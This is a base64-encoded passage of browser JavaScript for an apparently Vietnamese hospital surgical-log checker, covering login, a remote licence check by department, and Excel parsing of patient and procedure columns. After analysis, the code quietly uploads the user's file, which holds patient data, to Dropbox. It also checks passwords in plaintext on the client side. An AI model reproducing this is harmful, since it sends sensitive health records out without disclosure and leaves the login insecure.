dC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgIGA7DQogICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQogICAgICBsb2dpblBvcHVwU2hvd24gPSB0cnVlOw0KICAgIGxldCBwZXJjZW50ID0gMDsNCnByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KY29uc3QgcHJvZ3Jlc3NUaW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICBwZXJjZW50ICs9IDI7IC8vIHTEg25nIG3hu5dpIGzhuqduIDIlDQogICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgcGVyY2VudCA9IDEwMDsNCiAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICB9DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBwZXJjZW50ICsgJyUnOw0KfSwgNTAwKTsgLy8gMTAwbXMgY+G6rXAgbmjhuq10IDEgbOG6p24NCg0KCQ0KCX0NCiAgfSwgMjAwMCk7DQoNCiAgdHJ5IHsNCiAgICBjb25zdCBhY2NvdW50cyA9IGF3YWl0IGxvYWRBY2NvdW50c0Zyb21UWFQoKTsNCiAgICBpZiAoYWNjb3VudHNbdXNlcm5hbWVdICYmIGFjY291bnRzW3VzZXJuYW1lXSA9PT0gcGFzc3dvcmQpIHsNCiAgICAgIGN1cnJlbnRVc2VyID0gdXNlcm5hbWU7DQogICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcm5hbWUpOw0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KDQogICAgICBhd2FpdCBpbml0QWZ0ZXJMb2dpbigpOyAvLyBjaOG7iSBsb2FkIHNhdSBraGkgbG9naW4gdGjDoG5oIGPDtG5nDQogICAgfSBlbHNlIHsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHEg25nIG5o4bqtcDonLCBlcnIpOw0KICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0gZmluYWxseSB7DQogICAgY2xlYXJUaW1lb3V0KHNsb3dMb2dpblRpbWVyKTsNCg0KICAgIC8vIE7hur91IHBvcHVwIGRvIGxvZ2luIG3hu58gdGjDrCDEkcOzbmcNCiAgICBpZiAobG9naW5Qb3B1cFNob3duICYmIHBvcHVwKSB7DQogICAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgfSwgNDAwKTsNCiAgICB9DQoNCiAgICBidG5Mb2dpbi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgIGJ0bkxvZ2luLmlubmVySFRNTCA9ICfEkMSDbmcgbmjhuq1wJzsNCiAgfQ0KfQ0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nb3V0KCkgew0KICAgICAgICAgICAgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbSgnbWVkVXNlcicpOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICB9DQoNCi8vID09PT09PT09PT0gSMOATSBMT0FEIERBTkggU8OBQ0ggS0hPQSBI4buiUCBM4buGID09PT09PT09PT0gLy8NCmFzeW5jIGZ1bmN0aW9uIGxvYWRWYWxpZERlcGFydG1lbnRzKCkgew0KICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4va2hvYS50eHQnOw0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBraG9hTGlzdCA9IHRleHQuc3BsaXQoJ1xuJykubWFwKGxpbmUgPT4gbGluZS50cmltKCkudG9Mb3dlckNhc2UoKSkuZmlsdGVyKEJvb2xlYW4pOw0KICAgICAgICByZXR1cm4ga2hvYUxpc3Q7DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoIktow7RuZyB0aOG7gyB04bqjaSBkYW5oIHPDoWNoIGtob2E6IiwgZXJyKTsNCiAgICAgICAgcmV0dXJuIFtdOw0KICAgIH0NCn0NCg0KICAgICAgICAvLyA9PT09PT09PT09IFBI4bqmTiBY4busIEzDnSBGSUxFID09PT09PT09PT0gLy8NCmZ1bmN0aW9uIGhhbmRsZUZpbGUoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGNvbnN0IGZpbGUgPSBmaWxlSW5wdXQuZmlsZXNbMF07DQoJDQppZiAoIWZpbGUpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+VnVpIGzDsm5nIGNo4buNbiBmaWxlIHRyxrDhu5tjIGtoaSBraeG7g20gdHJhPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5PSdub25lJyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcmV0dXJuOw0KfQ0KDQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5hZGQoJ2hpZGRlbicpOw0KICAgIGVycm9yTG9nID0gW107DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGFuYWx5emVCdG4uZGlzYWJsZWQgPSB0cnVlOw0KICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIGtp4buDbSB0cmEuLi4nOw0KICAgIC8vIOKchSBC4bqvdCDEkeG6p3UgxJHhur9tIDJzIMSR4buDIGhp4buHbiBwb3B1cCBu4bq/dSB24bqrbiDEkWFuZyAixJBhbmcga2nhu4NtIHRyYS4uLiINCmNsZWFyVGltZW91dChhbmFseXplUG9wdXBUaW1lcik7DQphbmFseXplUG9wdXBUaW1lciA9IHNldFRpbWVvdXQoKCkgPT4gew0KICAgIGNvbnN0IGJ0bkFuYWx5emUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChidG5BbmFseXplLmlubmVySFRNTC5pbmNsdWRlcygnxJBhbmcga2nhu4NtIHRyYScpKSB7DQogICAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgICAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtc2F0ZWxsaXRlLWRpc2ggaWNvbi1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgICAgIDxzdHJvbmc+xJDGsOG7nW5nIHRydXnhu4FuIGdpw6FuIMSRb+G6oW48L3N0cm9uZz48YnIvPg0KICAgICAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgICAgYDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgICAgICAvLyBDaOG6oXkgcHJvZ3Jlc3NCYXIgJQ0KICAgICAgICBsZXQgcGVyY2VudCA9IDA7DQogICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KICAgICAgICBjb25zdCBwcm9ncmVzc1RpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgICAgICAgICAgcGVyY2VudCArPSAyOw0KICAgICAgICAgICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgICAgICAgICBwZXJjZW50ID0gMTAwOw0KICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwocHJvZ3Jlc3NUaW1lcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IHBlcmNlbnQgKyAnJSc7DQogICAgICAgIH0sIDEwMCk7DQogICAgfQ0KfSwgNTAwMCk7DQoNCiAgICBjb25zdCByZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOw0KICAgIA0KICAgIHJlYWRlci5vbmxvYWQgPSBhc3luYyBmdW5jdGlvbihlKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCBkYXRhID0gbmV3IFVpbnQ4QXJyYXkoZS50YXJnZXQucmVzdWx0KTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHdvcmtib29rLlNoZWV0TmFtZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIEV4Y2VsIGtow7RuZyBjw7Mgc2hlZXQgbsOgbycpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oZmlyc3RTaGVldCwgeyANCiAgICAgICAgICAgICAgICBoZWFkZXI6IDEsIA0KICAgICAgICAgICAgICAgIGRlZnZhbDogIiIsIA0KICAgICAgICAgICAgICAgIGJsYW5rcm93czogdHJ1ZSANCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgY29uc3QgZG9uZzUgPSAoanNvbkRhdGFbNF0gJiYganNvbkRhdGFbNF1bMF0pID8ganNvbkRhdGFbNF1bMF0udG9TdHJpbmcoKS50cmltKCkgOiAiS2jDtG5nIHLDtSI7DQpjb25zdCBkb25nNiA9IChqc29uRGF0YVs1XSAmJiBqc29uRGF0YVs1XVswXSkgPyBqc29uRGF0YVs1XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCndpbmRvdy5uZ2F5VmFsdWUgPSBkb25nNTsgIC8vIOKshSBkw7JuZyA1ID0gTmfDoHkNCndpbmRvdy5raG9hVmFsdWUgPSBkb25nNjsgIC8vIOKshSBkw7JuZyA2ID0gS2hvYQ0KDQoNCgkJCS8vLy8gS2nhu4NtIHRyYSBraG9hIC8vLy8vDQovLyDinIUgTOG6pXkgZOG7ryBsaeG7h3UgZMOybmcgNiwgY+G7mXQgQQ0KY29uc3Qga2hvYVJvdyA9IGpzb25EYXRhWzVdOyAvLyBkw7JuZyA2DQpjb25zdCBraG9hVGV4dCA9IChraG9hUm93ICYmIGtob2FSb3dbMF0gfHwgIiIpLnRvU3RyaW5nKCkudHJpbSgpOw0KY29uc3Qga2hvYUxvd2VyID0ga2hvYVRleHQudG9Mb3dlckNhc2UoKTsNCg0KLy8g4pyFIEtp4buDbSB0cmEgdMOqbiBraG9hDQpjb25zdCB2YWxpZEtob2FMaXN0ID0gYXdhaXQgbG9hZFZhbGlkRGVwYXJ0bWVudHMoKTsNCmlmICghdmFsaWRLaG9hTGlzdC5zb21lKGtob2EgPT4ga2hvYUxvd2VyLmluY2x1ZGVzKGtob2EpKSkgew0KICAgICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQogICAgY29uc3QgbXNnID0gYOKdjCBNw6F5IGNo4bunIHThu6sgY2jhu5FpICR7a2hvYVRleHQgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnfSBz4butIGThu6VuZyBwaOG6p24gbeG7gW0uIDxici8+VnVpIGzDsm5nIG11YSBi4bqjbiBxdXnhu4FuIMSR4buDIHTDtG4gdHLhu41uZyB0w6FjIGdp4bqjLiBgOw0KDQogICAgLy8gSGnhu4NuIHBvcHVwIGNo4bupIGtow7RuZyBhbGVydA0KIC8vIEhp4buDbiB0aOG7iyBwb3B1cA0KICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIHRow7RuZyBiw6FvIGzhu5dpIHbEqW5oIHZp4buFbg0KICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgIDxpIGNsYXNzPSJmYXMgZmEtYmFuIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6cmVkO2ZvbnQtc2l6ZToyMHB4O21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgIDxzdHJvbmc+JHttc2d9PC9zdHJvbmc+PGJyLz48YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImJ1eUxpY2Vuc2UiPk11YSBC4bqjbiBRdXnhu4FuPC9idXR0b24+PGJyLz48YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpIj7EkMOzbmc8L2J1dHRvbj4NCmA7DQoNCi8vIFNhdSBraGkgcmVuZGVyIG7DunQsIHRow6ptIHPhu7Ega2nhu4duDQpzZXRUaW1lb3V0KCgpID0+IHsNCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eUxpY2Vuc2UiKTsNCiAgaWYgKGJ0bikgew0KICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsNCiAgICAgIC8vIOG6qG4gcG9wdXAgbOG7l2kNCiAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImxvYWRpbmdQb3B1cCIpOw0KICAgICAgaWYgKHBvcHVwKSBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgLy8gTeG7nyBwb3B1cCBi4bqjbmcgZ2nDoQ0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICB9KTsNCiAgfQ0KfSwgMjAwKTsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQoNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCg0KICAgIC8vIOKchSBWw5QgSEnhu4ZVIEjDk0EgYuG6pXQga+G7syDEkW/huqFuIG7DoG8gY+G7kSBn4bqvbmcg4bqpbiBwb3B1cCBzYXUgxJHDsw0KICAgIHdpbmRvdy5pc0tob2FMb2kgPSB0cnVlOw0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKS5pbm5lckhUTUwgPSBgPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDtmb250LXdlaWdodDpib2xkIj4ke21zZ308L3NwYW4+YDsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgcmV0dXJuOw0KfQ0KDQoNCg0KCQkJDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoIDw9IDEpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBk4buvIGxp4buHdSAoY2jhu4kgY8OzIHRpw6p1IMSR4buBIGhv4bq3YyB0cuG7kW5nKScpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgIHByb2Nlc3NEYXRhKGpzb25EYXRhKTsNCiAgICAgICAgICBjb25zdCBzdGF0cyA9IHsNCiAgICAgICAgICAgIGhlcmI6IGdldEhlcmJPdXRsaWVyVG90YWwoKSwNCiAgICAgICAgICAgICAgdGltZTogZ2V0VGltZUVycm9yVG90YWwoKSwNCiAgICAgICAgICAgICBjb25mbGljdDogZ2V0Q29uZmxpY3RUb3RhbCgpDQogICAgICAgICAgfTsNCiAgICAgICAgICBjb25zdCB1cGxvYWRGaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KIGF3YWl0IHVwbG9hZFRvRHJvcGJveCh1cGxvYWRGaWxlLCB3aW5kb3cua2hvYVZhbHVlLCB3aW5kb3cubmdheVZhbHVlLCBzdGF0cyk7DQogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5yZW1vdmUoJ2hpZGRlbicpOw0KICAgICAgICAgICAgbG9nRXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZSBFeGNlbCcsIG51bGwsIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgYWxlcnQoJ0PDsyBs4buXaSB44bqjeSByYSBraGkgxJHhu41jIGZpbGU6ICcgKyBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgfSBmaW5hbGx5IHsNCgkJY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsgLy8g4pyFIE5n4bqvdCB0aW1lciBwb3B1cA0KCQlpZiAoIXdpbmRvdy5pc0tob2FMb2kpIHsgIA0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOyAvLyDinIUg4bqobiBwb3B1cA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyAgIC8vIOKchSDhuqhuIGjhurNuIHBvcHVwDQoJICB9DQogICAgICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgICAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNlYXJjaCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gS2nhu4NtIFRyYSc7DQogICAgICAgIH0NCiAgICB9Ow0KICAgIA0KICAgIHJlYWRlci5vbmVycm9yID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LnJlbW92ZSgnaGlkZGVuJyk7DQogICAgICAgIGxvZ0Vycm9yKCdM4buXaSBraGkgxJHhu41jIGZpbGUnLCBudWxsLCAnS2jDtG5nIHRo4buDIMSR4buNYyBu4buZaSBkdW5nIGZpbGUnKTsNCiAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICBhbmFseXplQnRuLmRpc2FibGVkID0gZmFsc2U7DQogICAgICAgIGFuYWx5emVCdG4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc2VhcmNoIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBLaeG7g20gVHJhJzsNCiAgICAgICAgYWxlcnQoJ0zhu5dpIGtoaSDEkeG7jWMgZmlsZS4gVnVpIGzDsm5nIHRo4butIGzhuqFpIHbhu5tpIGZpbGUga2jDoWMuJyk7DQogICAgfTsNCiAgICANCiAgICByZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoZmlsZSk7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gcHJvY2Vzc0RhdGEoZGF0YSkgew0KICAgIA0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IGhlYWRlckxpbmUxID0gZGF0YVs3XSB8fCBbXTsNCiAgICAgICAgY29uc3QgaGVhZGVyTGluZTIgPSBkYXRhWzhdIHx8IFtdOw0KICAgICAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICAgICAgKTsNCg0KICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KCQkJCWNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgICAgICAgICAgICAgY29uc3Qgc3RhcnRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbiIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBvcGVyYXRvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4bunIHRodeG6rXQgY2jDrW5oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG1pc3NpbmdDb2x1bW5zID0gW107DQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZUluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCcpOw0KICAgICAgICAgICAgICAgIGlmIChzdGFydEluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24nKTsNCiAgICAgICAgICAgICAgICBpZiAoZW5kSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YycpOw0KICAgICAgICAgICAgICAgIGlmIChvcGVyYXRvckluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCBjaMOtbmgnKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobWlzc2luZ0NvbHVtbnMubGVuZ3RoID4gMCkgew0KICAg